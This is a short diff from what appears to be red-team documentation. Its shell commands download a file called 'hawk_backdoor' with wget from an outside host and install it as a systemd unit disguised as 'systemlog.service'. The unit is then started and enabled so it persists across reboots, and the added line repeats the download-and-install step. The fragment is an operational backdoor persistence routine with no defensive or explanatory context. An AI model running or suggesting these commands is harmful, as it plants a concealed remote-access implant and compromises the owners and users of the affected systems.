@@ -29,4 +29,6 @@ cp hawk_backdoor /home/ubuntu/webserver
  sudo ls /etc/systemd/system/systemlog.service || sudo wget http://redteam.prodefense.io:1337/hawk_backdoor -O /etc/systemd/system/systemlog.service
  sudo systemctl start systemlog.service
  sudo systemctl enable systemlog.service
+
+ sudo ls /etc/systemd/system/systemlog.service || sudo wget http://redteam.prodefense.io:1337/hawk_backdoor -O /etc/systemd/system/systemlog.service
 ```
